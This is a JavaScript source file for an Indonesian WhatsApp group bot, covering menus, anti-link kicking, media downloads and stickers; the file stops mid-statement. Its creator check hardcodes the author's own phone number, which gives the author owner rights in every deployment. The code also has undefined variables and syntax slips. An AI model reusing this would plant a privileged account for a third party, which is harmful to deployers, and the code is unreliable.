/**
  * Created by Fauzijywrdna
  * Contact me on WhatsApp wa.me/6289528652225 
  * Subscribe me on Youtube : https://youtube.com/@fauzijayawardana
  
  * If you want to buy an updated script that is not encrypted, please WhatsApp me
*/

/**
INGAT BANG , INI SCRIPT GRATIS BUAT SEMUA ORANG , JANGAN DI JUAL!! JIKA SCRIPT DI JUAL NERAKA MENUNGGUMU!! 

SCRIPT ORI BUATAN FAUZII!!
*/

require("./settings");
const {
  BufferJSON,
  WA_DEFAULT_EPHEMERAL,
  generateWAMessageFromContent,
  proto,
  generateWAMessageContent,
  generateWAMessage,
  prepareWAMessageMedia,
  areJidsSameUser,
  getContentType,
} = require("@adiwajshing/baileys");
const fs = require("fs");
const fsx = require('fs-extra')
const util = require("util");
const speed = require("performance-now");
const chalk = require("chalk");
const axios = require("axios");
const moment = require("moment-timezone");
const FormData = require("form-data");
const { fromBuffer } = require("file-type");
const fetch = require("node-fetch");
const https = require('https')
const { exec } = require("child_process");
const similarity = require("similarity");
const threshold = 0.72;
const path = require("path");
const os = require("os");
const nou = require("node-os-utils");
const cheerio = require('cheerio')
const yts = require('yt-search')
const ms = require("parse-ms"); 
const { translate } = require('@vitalets/google-translate-api')
const defaultLang = 'es'
const tld = 'cn'
const more = String.fromCharCode(8206);
const readmore = more.repeat(4001);

//----------------- LIB FILE ------------------\\

const {
   sendButLoc,
   sendButDoC,
   sendButDoc,
   sendListMenu,
   sendListAge,
   sendListGender,
   sendListLang,
   sendButImage,
   sendKatalog,
   sendKatalog2,
   sendContact
} = require('./lib/welcome')
const alpha = require('./lib/welcome')
const {
  isSetOpen,
  addSetOpen,
  removeSetOpen,
  changeSetOpen,
  getTextSetOpen,
} = require("./lib/setopen");
const {
  isSetClose,
  addSetClose,
  removeSetClose,
  changeSetClose,
  getTextSetClose,
} = require("./lib/setclose");
const { isUrl, smsg, formatp, getRandom, getBuffer} = require("./lib/myfunc.js");
const {
  fetchJson,
  getGroupAdmins,
  TelegraPh,
  msToDate,
  hitungmundur,
  checkBandwidth,
  sleep,
  runtime
} = require("./lib/simple");
const {
  isSetWelcome,
  addSetWelcome,
  removeSetWelcome,
  changeSetWelcome,
  getTextSetWelcome,
} = require("./lib/setwelcome");
const { pinterest, yta, ytv } = require("./lib/pinterest")

//----------------- MENU.JS ------------------\\

const { allmenu,
        downloadmenu, 
        toolsmenu,
        ownermenu,
        groupmenu,
        funmenu,
        cecan,
        randomstiker,
        infomenu,
         } = require('./message/menu.js')

//========== [ audio ] ==========\\

ozii = fs.readFileSync("./image/ozii.jpg");
sad = fs.readFileSync("./sound.mp3");
const _data = require("./lib/totalcmd.js");
ara = fs.readFileSync("./ninakawaii/araara.mp3")
ownerr = fs.readFileSync('./vn/owner.mp3')
esc = fs.readFileSync('./image/esce.jpg')
thumb = fs.readFileSync('./image/img.jpg')

//============ NPM API ==============\\
const fg = require('api-dylux')

//----------------- DATABASE ------------------\\,

global.db = JSON.parse(fs.readFileSync("./database/database.json"))
if (global.db) global.db.data = {
         users: {},
         chats: {},
         database: {},
         game: {},
         others: {},
         sticker: {},
         absen: {},
         cmd: {},
         settings: {},
         anonymous: {},
         menfess: {},
         ...(global.db.data || {})
      }
     
//---------------------------------------------\\

module.exports = fureya = async (
    fureya,
    m,
    chatUpdate,
    store,
    antilink,
    antiwame,
    antilink2,
    antiwame2,
    set_welcome_db,
    set_left_db,
    set_open,
    set_close,
    _welcome,
    _left
) => {
    try {
        var body =
            m.mtype === "conversation" ?
            m.message.conversation :
            m.mtype == "imageMessage" ?
            m.message.imageMessage.caption :
            m.mtype == "videoMessage" ?
            m.message.videoMessage.caption :
            m.mtype == "extendedTextMessage" ?
            m.message.extendedTextMessage.text :
            m.mtype == "buttonsResponseMessage" ?
            m.message.buttonsResponseMessage.selectedButtonId :
            m.mtype == "listResponseMessage" ?
            m.message.listResponseMessage.singleSelectReply.selectedRowId :
            m.mtype == "templateButtonReplyMessage" ?
            m.message.templateButtonReplyMessage.selectedId :
            m.mtype === "messageContextInfo" ?
            m.message.buttonsResponseMessage?.selectedButtonId ||
            m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
            m.text :
            ""; //omzee
        var ownerin = '6289528652225@s.whatsapp.net';
        var budy = typeof m.text == "string" ? m.text : "";
        const isCmd = /^[°•π÷×¶∆£¢€¥®™�✓_=|~!?#/$%^&.+-,\\\©^]/.test(body);
        const prefix = isCmd ? budy[0] : "";
        const command = isCmd ?
            body.slice(1).trim().split(" ").shift().toLowerCase() :
            "";
        const args = body.trim().split(/ +/).slice(1);
        let limitCount = global.limitCount;
        const text = (q = url = args.join(" "));
        const type = Object.keys(mek.message)[0];
        const timestampp = speed();
        const latensi = speed() - timestampp;

        const pushname = m.pushName || "No Name";
        const botNumber = await fureya.decodeJid(fureya.user.id);
        const tanggal = moment().tz("Asia/jakarta").format("dddd, ll");
        const jam = moment(Date.now())
            .tz("Asia/jakarta")
            .locale("id")
            .format("HH:mm:ss z");
        const wita = moment(Date.now())
            .tz("Asia/makassar")
            .locale("id")
            .format("HH:mm:ss z");
        const salam = moment(Date.now())
            .tz("Asia/jakarta")
            .locale("id")
            .format("a");
        const isCreator = [botNumber, ...global.owner, '6289528652225@s.whatsapp.net'].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
        const theOwner = m.sender == ownerin
        /*const isCreator = [
                "6289528652225@s.whatsapp.net",
                global.owner,
                ...botNumber,
            ]
            .map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net")
            .includes(m.sender);*/
        const quoted = m.quoted ? m.quoted : m;
        const from = m.chat;
        const mime = (quoted.msg || quoted).mimetype || "";
        const isMedia = /image|video|sticker|audio/.test(mime);
        const groupMetadata = m.isGroup ?
            await fureya.groupMetadata(m.chat).catch((e) => {}) :
            "";
        const groupName = m.isGroup ? groupMetadata.subject : "";
        const participants = m.isGroup ? await groupMetadata.participants : "";
        const groupMembers = m.isGroup ? await groupMetadata.participants : ''
        let vnnya = JSON.parse(fs.readFileSync('./database/vnnya.json'))

        const totalFitur = () => {
            var mytext = fs.readFileSync("./case.js").toString()
            var numUpper = (mytext.match(/case/g) || []).length;
            return numUpper
        }
        for (let anju of vnnya) {
            if (budy === anju) {
                let buffer = fs.readFileSync(`./database/AUDIO/${anju}.mp3`)
                sendvn(buffer)
            }
        }
        cr = `*HAI KAK ${pushname}*`
        const { quotedMsg, mentioned, now, fromMe } = m


        const timestampi = speed();
        const latensii = speed() - timestampi;
        const tescuy = ['0@s.whatsapp.net']
        const groupAdmins = m.isGroup ? await getGroupAdmins(participants) : "";
        const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false;
        const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false;
        const isAntiLink = antilink.includes(m.chat) ? true : false;
        const isAntiWame = antiwame.includes(m.chat) ? true : false;
        const isAntiLink2 = antilink2.includes(m.chat) ? true : false;
        const isAntiWame2 = antiwame2.includes(m.chat) ? true : false;
        const isWelcome = _welcome.includes(m.chat);
        const isLeft = _left.includes(m.chat);
        const time = moment(Date.now())
            .tz("Asia/Jakarta")
            .locale("id")
            .format("HH:mm:ss z");
        const custom = ( pesan, tipe, target, target2 ) => {
            fureya.sendMessage(from, pesan, tipe, { quoted: { key: { fromMe: false, participants: `${target}`,...( from ? { remoteJid: from } : {}) }, message: { conversation: `${target2}`}}})
        }




        async function getGcName(groupID) {
            try {
                let data_name = await fureya.groupMetadata(groupID);
                return data_name.subject;
            } catch (err) {
                return "-";
            }
        }
        
        function mentions(teks, mems = [], id) {
			if (id == null || id == undefined || id == false) {
			  let res = fureya.sendMessage(from, { text: teks, mentions: mems })
			  return res
			} else {
		      let res = fureya.sendMessage(from, { text: teks, mentions: mems }, { quoted: uzii })
		      return res
 		    }
		}

        const reply = (text) => {
            fureya.sendFakeLink(m.chat, text, salam, pushname)
        }


        if (m.message) {
            fureya.readMessages([m.key]);
            console.log(
                chalk.black(chalk.bgWhite("[ CMD ]")),
                chalk.black(chalk.bgGreen(new Date())),
                chalk.black(chalk.bgBlue(budy || m.mtype)) +
                "\n" +
                chalk.magenta("=> From"),
                chalk.green(pushname),
                chalk.yellow(m.sender) + "\n" + chalk.blueBright("=> In"),
                chalk.green(m.isGroup ? pushname : "Chat Pribadi", m.chat)
            );
        }

        if (isAntiLink) {
            if (budy.match(`chat.whatsapp.com`)) {
                reply(
                    `*「 ANTI LINK 」*\n\nLink grup detected, maaf kamu akan di kick !`
                );
                if (!isBotAdmins) return reply(`gajadi dehhh bot bukan admin`);
                let gclink =
                    `https://chat.whatsapp.com/` + (await fureya.groupInviteCode(m.chat));
                let isLinkThisGc = new RegExp(gclink, "i");
                let isgclink = isLinkThisGc.test(m.text);
                if (isgclink)
                    return reply(`duhh hampir aja ku kick ternyta link gc sendiri`);
                if (isAdmins) return reply(`gamau kalo kik atmin`);
                if (isCreator) return reply(`ownerkuu yangg gntengg mhh bebass`);
                if (m.key.fromMe) return reply(`ownerkuuu mahh bebass`);
                await fureya.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,
                        fromMe: false,
                        id: m.key.id,
                        participant: m.key.participant,
                    },
                });
                fureya.groupParticipantsUpdate(m.chat, [m.sender], "remove");
            }
        }

        if (isAntiLink2) {
            if (budy.match(`chat.whatsapp.com`)) {
                if (!isBotAdmins) return; //reply(`Upsss... gajadi, bot bukan admin`)
                let gclink =
                    `https://chat.whatsapp.com/` + (await fureya.groupInviteCode(m.chat));
                let isLinkThisGc = new RegExp(gclink, "i");
                let isgclink = isLinkThisGc.test(m.text);
                if (isgclink) return; //reply(`Upsss... gak jadi, untung link gc sendiri`)
                if (isAdmins) return; //reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
                if (isCreator) return; //reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
                if (m.key.fromMe) return; //reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
                await fureya.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,

                        fromMe: false,
                        id: m.key.id,
                        participant: m.key.participant,
                    },
                });
            }
        }

        if (!fureya.public) {
            if (!m.key.fromMe && !isCreator && !theOwner) return
        }

        if (isAntiWame) {
            if (budy.match(`wa.me/`)) {
                reply(`*「 ANTI WA ME 」*\n\nWa Me detected, maaf kamu akan di kick !`);
                if (!isBotAdmins) return reply(`Upsss... gajadi, bot bukan admin`);
                if (isAdmins)
                    return reply(`Upsss... gak jadi, kasian adminnya klo di kick`);
                if (isCreator)
                    return reply(`Upsss... gak jadi, kasian owner ku klo di kick`);
                if (m.key.fromMe)
                    return reply(`Upsss... gak jadi, kasian owner ku klo di kick`);
                await fureya.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,

                        fromMe: false,
                        id: m.key.id,
                        participant: m.key.participant,
                    },
                });
                fureya.groupParticipantsUpdate(m.chat, [m.sender], "remove");
            }
        }

        if (isAntiWame2) {
            if (budy.match(`wa.me/`)) {
                if (!isBotAdmins) return; //reply(`Upsss... gajadi, bot bukan admin`)
                if (isAdmins) return; //reply(`Upsss... gak jadi, kasian adminnya klo di kick`)
                if (isCreator) return; //reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
                if (m.key.fromMe) return; //reply(`Upsss... gak jadi, kasian owner ku klo di kick`)
                await fureya.sendMessage(m.chat, {
                    delete: {
                        remoteJid: m.chat,

                        fromMe: false,
                        id: m.key.id,
                        participant: m.key.participant,
                    },
                });
            }
        }
        if (isAntiWame) {
            if (budy.includes(`Wa.me/` || `Wa.me/`)) {
                reply(`*「 ANTI WA ME 」*\n\nWa Me detected, maaf kamu akan di kick !`);
                if (!isBotAdmins) return reply(`Upsss... gajadi, bot bukan admin`);
                if (isAdmins)
                    return reply(`Upsss... gak jadi, kasian adminnya klo di kick`);
                if (isCreator)
                    return reply(`Upsss... gak jadi, kasian owner ku klo di kick`);
                if (m.key.fromMe)
                    return reply(`Upsss... gak jadi, kasian owner ku klo di kick`);
                fureya.groupParticipantsUpdate(m.chat, [m.sender], "remove");
            }
        }


        switch (command) {
        
        case "help":
        case "listmenu":
        case "menu": {
        var mundur = await hitungmundur(4, 23);
            fureya.sendMessage(from, {
                text:
                `*Selamat ${salam.slice(0, 1).toUpperCase() + salam.slice(1)} @⁨${pushname}*

┌──「 *INFORMASI* 」
│
│❏ *${namabot}*
│❏ *Owner:* *${namaowner}*
│❏ *Kontak:*
│ *${kontaklu}*
│❏ *Waktu:* *${jam}*
│❏ *Tanggal:* *${tanggal}*
│❏ *STATUS* : *PUBLIC*
│❏ *Prefix :「 MULTI PREFIX 」*
│❏ *HITUNG MUNDUR IDUL FITRI:*
│❏ _${mundur}_
│❏ *Group FureyaMd:*
│❏ *[ s.id/oziioffc ]*
│ 
├───「 *𝗦𝗧𝗔𝗧𝗨𝗦 𝗨𝗦𝗘𝗥* 」
│❏ *Name* : *${pushname}* 
│❏ *Your API* :
│ *https://wa.me/${m.sender.split("@")[0]}*
│
├───「 *𝗠𝗘𝗡𝗨 𝘽𝙊𝙏* 」
│❏ *${prefix}downloadmenu*
│❏ *${prefix}toolsmenu*
│❏ *${prefix}ownermenu*
│❏ *${prefix}funmenu*
│❏ *${prefix}groupmenu*
│❏ *${prefix}infomenu*
│❏ *${prefix}randomstiker*
│❏ *${prefix}cecan*
│❏ *${prefix}allmenu*
├──── 「 BOT STATUS 」 ──
│
│❏ Runtime: 
│❏ *${runtime(process.uptime())}*
│❏ Total Feature: ${totalFitur()}
│❏ Total user: 12417
│❏ Speeds: ${latensi.toFixed(4)} _Second_
├───「 *END STATUS* 」
│❏ Info:
│ Harap kasih jeda setiap 
│ menggunakan bot selama 
│ 5 detik atau tidak 
│ Fureya block/ban dan perintah
│ Fureya tidak menggunakan tanda 
│ [ ] 
│ terima kasih *@⁨${namaowner}*
│
└─────「 *Fureya Bot* 」`
            }, { quoted: uzii })
        }
        break
        
        case 'downloadmenu':
        case 'dlmenu':
        case 'menudl':
        case 'menudownload':{
            fureya.sendMessage(from, { text: downloadmenu(prefix) }, { quoted: m })
            }
        break
        
        case 'toolsmenu':
        case 'tools':
        case 'tool':
        case 'toolmenu':{
            fureya.sendMessage(from, { text: toolsmenu(prefix) }, { quoted: m })
            }
        break
        
        case 'ownermenu':
        case 'menuowner':
        case 'ownerm':
        case 'mowner':{
            fureya.sendMessage(from, { text: ownermenu(prefix) }, { quoted: m })
            }
        break
        
        case 'funnmenu':
        case 'funmenu':
        case 'fun':
        case 'funn':{
            fureya.sendMessage(from, { text: funmenu(prefix) }, { quoted: m })
            }
        break
        
        case 'groupm':
        case 'mgroup':
        case 'groupmenu':
        case 'grupmenu':{
            fureya.sendMessage(from, { text: groupmenu(prefix) }, { quoted: m })
            }
        break
        
        case 'cecan':
        case 'randomcecan':
        case 'cecanmenu':
        case 'cecanrandom':{
            fureya.sendMessage(from, { text: cecan(prefix) }, { quoted: m })
            }
        break
        
        case 'randomstiker':
        case 'randoms':
        case 'srandom':
        case 'stikerrandom':{
            fureya.sendMessage(from, { text: randomstiker(prefix) }, { quoted: m })
            }
        break
        
        case 'info':
        case 'infomenu':
        case 'menuinfo':
        case 'minfo':{
            fureya.sendMessage(from, { text: infomenu(prefix) }, { quoted: m })
            }
        break
        
        case "allmenu": {
            fureya.sendMessage(from, { 
                audio: ara,
                mimetype: 'audio/mpeg',
                ptt: true,
            });
            var mundur = await hitungmundur(4, 23);
            var {
                totalGb,
                usedGb,
                freeGb
            } = await nou.drive.info();
            var {
                download,
                upload
            } = await checkBandwidth();
            fureya.sendMessage(from, {
                contextInfo: {
                    externalAdReply: {
                        showAdAttribution: true,
                        title: `𝐅𝐮𝐫𝐞𝐲𝐚𝐌𝐝`,
                        thumbnail: pp_bot,
                        sourceUrl: gc,
                        mediaType: 1,
                        renderLargerThumbnail: true
                    }
                },
                text: allmenu(prefix)
            }, {
                quoted: uzii
            })
        }
        break
        
        case "tes": 
            fureya.sendMessage(from, { text: '*BOT SIAP DIGUNAKAN*' }, { quoted: uzii })
        break


        case "sc":
        case "script":
        case "soucecode": {
        gblh = fs.readFileSync('./vn/sc.mp3')
        fureya.sendImageAsSticker(m.chat, esc, m, {
                    packname: packname,
                    author: author
                }),
        fureya.sendMessage(from, { audio : gblh, mimetype: 'audio/mpeg', ptt: true })
                setTimeout(() => {
            fureya.relayMessage(m.chat, {
                "requestPaymentMessage": {
                    amount: {
                        value: 2022000,
                        offset: 0,
                        currencyCode: 'IDR'
                    },
                    amount1000: 500000000,
                    background: null,
                    currencyCodeIso4217: 'IDR',
                    expiryTimestamp: 0,
                    noteMessage: {
                        extendedTextMessage: {
                            text: `*GADA SC KALO MAU AMBIL BASE NYA AJA*\n*https://youtu.be/85D-aKbu4LE?si=bh27ZfNYOc78LQxU*\n\n*${global.footer_text}*`
                        }
                    },
                    requestFrom: m.sender
                }
            }, {})
            }, 10000)
        }
        break
        
        case "nino": {
        if (!text) return m.reply('apa yang ingin kamu tanyakan kepada saya?')
        let api = await fetch(`https://api-kazedevid.vercel.app/gpt/gptnino?text=${text}`)
        let res = await api.json()
        m.reply(res)
        }
        break

        case "owner":
        case "creator": {
            fureya.sendContact(m.chat, global.owner, m);
            fureya.sendMessage(m.chat, {
                audio: ownerr,
                mimetype: "audio/mpeg",
                ptt: true,
            });
        }
        break;

        case 'tqto': {
                let tq = `
✧━━━━[ *THANKS TO* ]━━━━✧
\n✧ *FauziJayawardana (AUTHOR)*\n✧ *zeeoneofc*\n✧ *Nansoffc*\n✧ *atminLolhuman*\n✧ *caliph*\n✧ *DikaArdnt*
                `
                fureya.sendMessage(from, { text : tq }, {quoted: m})
            }
        break

        case "runtime": {
            reply(`bot aktif selama *${runtime(process.uptime())}*`)
        }
        break
        
        case 'cekprem':
            case 'cekpremium':
                if (!isPremium) return reply(`Kamu bukan user premium, kirim perintah *${prefix}daftarprem* untuk membeli premium`)
                if (isCreator) return m.reply(`Lu owner bego!`)
                if (_prem.getPremiumExpired(sender, premium) == "PERMANENT") return reply(`PERMANENT`)
                let cekvip = ms(_prem.getPremiumExpired(sender, premium) - Date.now())
                let premiumnya = `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s)`
                m.reply(premiumnya)
                break

        case 'listprem':
                let txt = `List Prem\nJumlah : ${premium.length}\n\n`
                let men = [];
                for (let i of premium) {
                    men.push(i.id)
                    txt += `*ID :* @${i.split("@")[0]}\n`
                  if (i.expired === 'PERMANENT') {
                    let cekvip = 'PERMANENT'
                    txt += `*Expire :* PERMANENT\n\n`
                  } else {
                    let cekvip = ms(i.expired - Date.now())
                    txt += `*Expire :* ${cekvip.days} day(s) ${cekvip.hours} hour(s) ${cekvip.minutes} minute(s) ${cekvip.seconds} second(s)\n\n`
                  }
                }
                mentions(txt, men, true)
                break

        case "ping": {
            const used = process.memoryUsage();
            const cpus = os.cpus().map((cpu) => {
                cpu.total = Object.keys(cpu.times).reduce(
                    (last, type) => last + cpu.times[type],
                    0
                );
                return cpu;
            });
            const cpu = cpus.reduce(
                (last, cpu, _, {
                    length
                }) => {
                    last.total += cpu.total;
                    last.speed += cpu.speed / length;
                    last.times.user += cpu.times.user;
                    last.times.nice += cpu.times.nice;
                    last.times.sys += cpu.times.sys;
                    last.times.idle += cpu.times.idle;
                    last.times.irq += cpu.times.irq;
                    return last;
                }, {
                    speed: 0,
                    total: 0,
                    times: {
                        user: 0,
                        nice: 0,
                        sys: 0,
                        idle: 0,
                        irq: 0,
                    },
                }
            );
            let timestamp = speed();
            let latensi = speed() - timestamp;
            let neww = performance.now();
            let oldd = performance.now();
            let respon = `
Kecepatan Respon ${latensi.toFixed(4)} _Second_ \n ${
            oldd - neww
          } _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
💻 Info Server
RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
_NodeJS Memory Usaage_
${Object.keys(used)
  .map(
    (key, _, arr) =>
      `${key.padEnd(Math.max(...arr.map((v) => v.length)), " ")}: ${formatp(
        used[key]
      )}`
  )
  .join("\n")}
${
  cpus[0]
    ? `_Total CPU Usage_
${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times)
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}
_CPU Core(s) Usage (${cpus.length} Core CPU)_
${cpus
  .map(
    (cpu, i) =>
      `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(
        cpu.times
      )
        .map(
          (type) =>
            `- *${(type + "*").padEnd(6)}: ${(
              (100 * cpu.times[type]) /
              cpu.total
            ).toFixed(2)}%`
        )
        .join("\n")}`
  )
  .join("\n\n")}`
    : ""
}
                `.trim();
            reply(respon);
        }
        break;

        case "groupbot":
        case "gcbot": {
            reply(global.gc)
        }
        break;

        case "donasi":
        case "donate": {
            reply(`
    ╔═══⟬ *${command}*  ⟭
    ╠ ▢ *6289528652225* *_"DANA"_*
    ╠ ▢ *6289528652225* *_"GOPAY"_*
    ╚════◇
          `);
        }
        break;

        case 'ytmp3':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			reply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytaudio2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `☫ Title    : *${data.result.title}*\n`
					caption += `☫ Size     : *${data.result.size}*`
					fureya.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
						fureya.sendMessage(m.chat, { audio: { url: data.result.link }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
					})
				})
				.catch(console.error)
			break
			
        case 'ytmp4':
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.youtube.com/watch?v=qZIQAk-BUEc`)
			reply(mess.wait)
			axios
				.get(`https://api.lolhuman.xyz/api/ytvideo2?apikey=${apikey}&url=${args[0]}`)
				.then(({ data }) => {
					var caption = `☫ Title    : *${data.result.title}*\n`
					caption += `☫ Size     : *${data.result.size}*`
					fureya.sendMessage(m.chat, { image: { url: data.result.thumbnail }, caption }).then(() => {
						fureya.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4', fileName: `${data.result.title}.mp4` })
					})
				})
				.catch(console.error)
			break
			
			case 'tiktokv2': {
			if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/tiktok?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				fureya.sendMessage(m.chat, { video: { url: data.result.link }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
			case 'tiktokaudio': {
			if (args.length == 0) return reply(`Example: ${prefix + command} https://vt.tiktok.com/ZSwWCk5o/`)
			reply(mess.wait)
			fureya.sendMessage(m.chat, { audio: { url: `https://api.lolhuman.xyz/api/tiktokmusic?apikey=${apikey}&url=${args[0]}` }, mimetype: 'audio/mp4', fileName: `${data.result.title}.mp3` })
			
			}
			break
			
			case 'igdl': {
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
			reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				var url = data.result[0]
				if (url.includes('.mp4')) {
					fureya.sendMessage(m.chat, { video: { url }, mimetype: 'video/mp4' })
				} else {
					fureya.sendMessage(m.chat, { image: { url } })
				}
			})
			
            }
			break
			
			
		    case 'igdl2': {
			if (args.length == 0) return reply(`Example: ${prefix + command} https://www.instagram.com/p/CJ8XKFmJ4al/?igshid=1acpcqo44kgkn`)
			reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/instagram2?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				for (var x of data.result) {
					if (x.includes('.mp4')) {
						fureya.sendMessage(m.chat, { video: { url: x }, mimetype: 'video/mp4' })
					} else {
						fureya.sendMessage(m.chat, { image: { url: x } })
					}
				}
			})
			
			}
			break
			
			case 'twtdl': {
			if (args.length == 0) return reply(`Example: ${prefix + command} https://twitter.com/gofoodindonesia/status/1229369819511709697`)
			reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/twitter?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				fureya.sendMessage(m.chat, { video: { url: data.result.link[data.result.link.length - 1].link }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
		    case 'fbdl': {
			if (args.length == 0) return reply(`Example: ${prefix + command} https://id-id.facebook.com/SamsungGulf/videos/video-bokeh/561108457758458/`)
			reply(mess.wait)
			axios.get(`https://api.lolhuman.xyz/api/facebook?apikey=${apikey}&url=${args[0]}`).then(({ data }) => {
				fureya.sendMessage(m.chat, { video: { url: data.result }, mimetype: 'video/mp4' })
			})
			
			}
			break
			
			case 'git': case 'gitclone': {
                if (!args[0]) return reply(`Mana link nya?\nContoh :\n${prefix}${command} https://github.com/YukiShima4/tes`)
                if (!isUrl(args[0]) && !args[0].includes('github.com')) return reply(`Link invalid!!`)
                let regex1 = /(?:https|git)(?::\/\/|@)github\.com[\/:]([^\/:]+)\/(.+)/i
                let [, user, repo] = args[0].match(regex1) || []
                repo = repo.replace(/.git$/, '')
                let url = `https://api.github.com/repos/${user}/${repo}/zipball`
                let filename = (await fetch(url, {method: 'HEAD'})).headers.get('content-disposition').match(/attachment; filename=(.*)/)[1]
                fureya.sendMessage(m.chat, { document: { url: url }, fileName: filename+'.zip', mimetype: 'application/zip' }, { quoted: m }).catch((err) => reply(mess.error))
            }       
            break
			
        case "ttslide": {
        if (!args[0]) {
    throw `Masukkan URL!\n\ncontoh:\n${prefix + command} https://vt.tiktok.com/ZSL77JfSs/`;
  }
    if (!args[0].match(/tiktok/gi)) {
      throw `URL Tidak Ditemukan!`;
    }
    m.reply('*Mohon tunggu...*');
    try {
    const api = await fetch(`https://api.betabotz.org/api/download/ttslide?url=${args[0]}&apikey=${API}`);
    const res = await api.json();
    var {
      id, 
      region, 
      title,
      play
    } = res.result.data
    for (let i of res.result.data.images) {
    await sleep(3000)
    fureya.sendFile(m.chat, i, null, `*Deskripsi:* ${title}\n*Region*: ${region}\n*ID:* ${id}\n*Audio:* ${play}`, m);
        }
  } catch (e) {
    console.log(e);
    throw `🚩 *Terjadi kesalahan, cek apikey mu!*`
  }
        }
        break
        
        case "tiktoknowm":
        case "tiktok": {
            if (args.length < 1) return reply("Link?");
            if (!isUrl(args[0]) && !args[0].includes("tiktok.com"))
                return reply("Error link");
            if (q.startsWith("https://vt.tiktok.com/")) {
                var lin = args[0];
            } else if (q.startsWith("https://vm.tiktok.com/")) {
                var lin = args[0];
            } else if (q.startsWith("https://www.tiktok.com/")) {
                var lin = args[0];
            } else {
                return Reply("Masukan link tikok, contoh https://vt.tiktok.com/");
            }
            reply(mess.wait);
            const {
                tiktokdlv2
            } = require("@bochilteam/scraper");
            tiktokdlv2(lin).then((res) => {
                let ep = res.video.no_watermark;
                fureya.sendMessage(
                    m.chat, {
                        caption: (mess.done),
                        video: {
                            url: ep
                        }
                    }, {
                        quoted: m
                    }
                );
            });
        }
        break;
        
        case 'ytsearch':
        case 'youtubesearch':
        case 'yts': {
         	if (!text) throw '✳️ Apa yang Anda ingin saya telusuri di YouTube?'
         	m.reply(mess.wait)
  let results = await yts(text)
  let tes = results.all
  let teks = results.all.map(v => {
    switch (v.type) {
      case 'video': return `
▢ ${v.title}
▢ *Link* : ${v.url}
▢ *Durasi* : ${v.timestamp}
▢ *Upload :* ${v.ago}
▢ *Views:* ${v.views}

   `.trim()
      case 'canal': return `
▢ *${v.name}* (${v.url})
▢${v.subCountLabel} (${v.subCount}) Suscribirse
▢ ${v.videoCount} videos
`.trim()
    }
  }).filter(v => v).join('\n\n________________________\n\n')
  fureya.sendFile(m.chat, tes[0].thumbnail, 'yts.jpeg', teks, m)
        }
        break

        case "patrick":
            case "popoci":
            case "sponsbob":
            case "kawan-sponsbob":
            case "awoawo":
            case "chat":
            case "benedict":
            case "dbfly":
            case "dino-kuning":
            case "doge":
            case "gojosatoru":
            case "hope-boy":
            case "jisoo":
            case "kr-robot":
            case "kucing":
            case "lonte":
            case "manusia-lidi":
            case "menjamet":
            case "meow":
            case "nicholas":
            case "tyni": {
                reply(mess.wait)
                try {
                let res = await fetch(global.api('fauzi', '/api/telegram-sticker/' + command, {}, 'apikey'))
                if (!res.ok) throw await res.text()
                let img = await res.buffer()
                let savestik = await fureya.sendImageAsSticker(m.chat, img, m, {
                    packname: packname,
                    author: author
                })*
                await fs.unlinkSync(savestik)
              }catch(e) {
                 m.reply('*limit sudah habis tunggu besok lagi ya😔*')
              }
            }
            break
            
            case 'freya': {
            let res = (await axios.get(`https://raw.githubusercontent.com/oziispedzz/TheMystic-Bot-MD/master/src/JSON/jkt-${command}.json`)).data  
let haha = await res[Math.floor(res.length * Math.random())]    
fureya.sendFile(m.chat, haha, 'error.jpg', `_${command}_`, m)
            }
            break

        case 'swm':
        case 'take':
        case 'wm': {

            if (!quoted) return reply('mana?')
            if (quoted.isAnimated) {
                let media = await fureya.downloadAndSaveMediaMessage(quoted)
                let webpToMp4 = await webp2mp4File(media)
                let encmedia = await fureya.sendVideoAsSticker(m.chat, webpToMp4.result, m, {
                    packname: text.split('|')[0] ? text.split('|')[0] : pushname,
                    author: text.split('|')[1] ? text.split('|')[1] : ''
                })
                await fs.unlinkSync(encmedia)
            } else if (/image/.test(mime)) {
                let media = await quoted.download()
                let encmedia = await fureya.sendImageAsSticker(m.chat, media, m, {
